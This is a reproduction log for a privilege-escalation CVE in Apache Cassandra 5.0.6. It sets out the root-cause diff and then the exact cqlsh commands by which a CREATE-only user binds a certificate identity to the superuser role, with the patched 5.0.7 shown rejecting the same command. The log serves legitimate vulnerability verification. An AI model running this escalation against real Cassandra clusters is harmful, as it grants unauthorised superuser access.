# CASSANDRA-21219 — Reproduction Evidence Log

**Bug:** Disallow binding an identity to a superuser when the user is a regular user
**CVE:** CVE-2026-27314 (privilege escalation)
**Buggy version:** 5.0.6 (image `cassandra:5.0.6`)
**Fixed version (control):** 5.0.7 (image `cassandra:5.0.7`, fix released 2026-03-18)
**Component:** CQL/Interpreter (cql-semantics / security)
**Topology:** single-node pod in kind, namespace `repro-21219`
**Disposition:** REPRODUCED

---

## 1. Primary source (Jira JSON)

`/tmp/jira_issues/CASSANDRA-21219.json` — `fields.description`:

> CVE-2026-27314 – https://www.cve.org/CVERecord?id=CVE-2026-27314
> Privilege escalation in Apache Cassandra 5.0 on an mTLS environment using
> MutualTlsAuthenticator allows a user with only CREATE permission to associate
> their own certificate identity with an arbitrary role, including a superuser
> role, and authenticate as that role via ADD IDENTITY.

The JSON contains NO concrete CQL/cert reproducer — only the CVE summary. The
reproducer below was derived from the root-cause source diff (Section 2).

## 2. Root cause — exact code path and the fix

Fetched `AddIdentityStatement.java` at both tags from the Apache Cassandra repo.

`diff cassandra-5.0.6 (buggy) vs cassandra-5.0.7 (fixed)`
`src/java/org/apache/cassandra/cql3/statements/AddIdentityStatement.java`:

```
54c55,58
<         checkPermission(state, Permission.CREATE, state.getUser().getPrimaryRole());
---
>         checkPermission(state, Permission.CREATE, RoleResource.root());
>
>         if (!state.getUser().isSuper() && DatabaseDescriptor.getRoleManager().isSuper(RoleResource.role(role)))
>             throw new UnauthorizedException("Only superusers can bind identities to a role with superuser status");
```

Buggy `AddIdentityStatement.authorize(ClientState)` (5.0.6, verified verbatim from
the released image source) only checks `Permission.CREATE` on the *caller's own
primary role* — a permission every CREATE-granted regular user trivially holds —
and `execute()` then calls `DatabaseDescriptor.getRoleManager().addIdentity(identity, role)`
with NO superuser guard. The fix (a) raises the bar to CREATE on `RoleResource.root()`
and (b) explicitly rejects a non-superuser binding an identity to a superuser role.

The ONLY auth gate on the whole path is `validate() -> state.ensureNotAnonymous()`
(must be logged in). `AuthenticationStatement.checkPermission` has zero
authenticator-type branching. Therefore the authz bug is independent of HOW the
client connected: mTLS/MutualTlsAuthenticator is the *exploitation context* (where a
bound identity becomes a login credential), not part of the vulnerable code path.
This is why the bug reproduces faithfully under PasswordAuthenticator with NO PKI.

## 3. Pre-checks on a plain 5.0.6 pod (AllowAllAuthenticator)

```
$ kubectl exec -n repro-21219 cass -- cqlsh -e "ADD IDENTITY 'spiffe://test/probe' TO ROLE cassandra"
<stdin>:1:Unauthorized: Error from server: code=2100 [Unauthorized] message="You have to be logged in and not anonymous to perform this request"
```
Confirms: (a) `ADD IDENTITY` is valid grammar in 5.0.6; (b) the sole gate is
`ensureNotAnonymous()`; (c) identity table = `system_auth.identity_to_role`.
`[cqlsh 6.2.0 | Cassandra 5.0.6 | CQL spec 3.4.7 | Native protocol v5]`

## 4. BUGGY 5.0.6 — reproduction

Pod `cass` deployed at `cassandra:5.0.6` with a command override that replaces the
yaml keys (no dup-key error): `authenticator: PasswordAuthenticator`,
`authorizer: CassandraAuthorizer`. Log confirmed
`authenticator=PasswordAuthenticator{}; authorizer=CassandraAuthorizer{}; role_manager=CassandraRoleManager{}`.

Setup (as superuser `cassandra/cassandra`):
```
CREATE ROLE IF NOT EXISTS bob WITH PASSWORD = 'bob' AND LOGIN = true AND SUPERUSER = false;
GRANT CREATE ON ALL ROLES TO bob;
GRANT CREATE ON ALL KEYSPACES TO bob;
```
Roles table:
```
 role      | is_superuser | can_login
-----------+--------------+-----------
       bob |        False |      True
 cassandra |         True |      True
```
bob's permissions (CREATE only):
```
 role | username | resource        | permission
------+----------+-----------------+------------
  bob |      bob | <all keyspaces> |     CREATE
  bob |      bob |     <all roles> |     CREATE
```

EXPLOIT — connected AS regular user bob (`-u bob -p bob`):
```
$ kubectl exec -n repro-21219 cass -- cqlsh -u bob -p bob -e \
    "ADD IDENTITY 'spiffe://repro/bob' TO ROLE cassandra;"
   <no output>            <-- SUCCEEDED (silent success, EXPLOIT_RC=0)
```

Resulting binding (read back as superuser `cassandra`):
```
 identity           | role
--------------------+-----------
 spiffe://repro/bob | cassandra

(1 rows)
```

**BUGGY SIGNATURE:** a non-superuser (bob, CREATE-only) successfully bound the
client-cert identity `spiffe://repro/bob` to the SUPERUSER role `cassandra`.
A client presenting that identity over mTLS would now authenticate as the
superuser — the privilege escalation of CVE-2026-27314.

## 5. FIXED 5.0.7 — A/B control

Pod redeployed at `cassandra:5.0.7`, IDENTICAL command override and IDENTICAL
workload. Version confirmed `[cqlsh 6.2.0 | Cassandra 5.0.7 | CQL spec 3.4.7 | Native protocol v5]`.

Identical setup (bob: is_superuser=False, can_login=True; GRANT CREATE ON ALL ROLES + ALL KEYSPACES).

CONTROL — connected AS regular user bob:
```
$ kubectl exec -n repro-21219 cass -- cqlsh -u bob -p bob -e \
    "ADD IDENTITY 'spiffe://repro/bob' TO ROLE cassandra;"
<stdin>:1:Unauthorized: Error from server: code=2100 [Unauthorized] message="Only superusers can bind identities to a role with superuser status"
command terminated with exit code 2
```
identity_to_role AFTER the rejected attempt (read as superuser): EMPTY
```
 identity | role
----------+------

(0 rows)
```

The fixed build REJECTS the identical operation with the exact message added by the
patch (`UnauthorizedException("Only superusers can bind identities to a role with
superuser status")`) and creates NO binding. This is the clean A/B contrast to the
silent success + `spiffe://repro/bob -> cassandra` row on buggy 5.0.6.

## 6. Summary

| | 5.0.6 (buggy) | 5.0.7 (fixed, control) |
|---|---|---|
| bob runs ADD IDENTITY -> superuser | succeeds silently (rc=0) | Unauthorized (code=2100) |
| identity_to_role after | `spiffe://repro/bob -> cassandra` (1 row) | empty (0 rows) |
| escalation achieved | YES | NO |

DISPOSITION: **reproduced**. Verbatim buggy signature = the created binding row
`spiffe://repro/bob | cassandra` (a CREATE-only non-superuser bound its identity to
the superuser role). Confirmed by the fixed-version control rejecting the identical
command. Note: the "blocked-hard (needs full mTLS PKI)" prior assessment was
over-scoped — the vulnerable authz path (`AddIdentityStatement.authorize`/`execute`)
has no authenticator-type dependency, so PasswordAuthenticator with no PKI exercises
the identical code path. mTLS is only the downstream means of *using* the bound
identity, not part of the bug.

